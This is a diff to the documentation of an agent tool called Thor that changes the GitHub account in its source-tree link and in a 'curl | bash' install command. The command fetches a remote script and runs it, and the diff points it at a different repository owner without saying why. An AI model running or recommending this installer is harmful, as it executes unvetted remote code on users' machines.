@@ -55,7 +55,7 @@ Good verification targets, cheapest first:
 
 - **Every shipped feature, one line each: https://thor-agent.thor-agent.local/docs/llms.txt.** Start here for any "can Thor do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://thor-agent.thor-agent.local/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
 - CLI commands: `thor --help`, `thor <command> --help`, and `thor_cli/main.py`
-- Source tree: https://github.com/dwisetyabudi15581/Thor-agent
+- Source tree: https://github.com/thor726/Thor-agent
 
 Never answer "Thor can't do that" from memory. Thor ships far more than this skill body describes, and the index exists so a negative answer is always checkable.
 
@@ -63,7 +63,7 @@ Never answer "Thor can't do that" from memory. Thor ships far more than this ski
 
 ```bash
 # Install (shell installer — bootstraps PM, Python, dependencies, and the launcher)
-curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/thor726/Thor-agent/main/scripts/install.sh | bash
 
 # Interactive chat (default surface; set display.interface: tui to launch the Ink TUI instead)
 thor
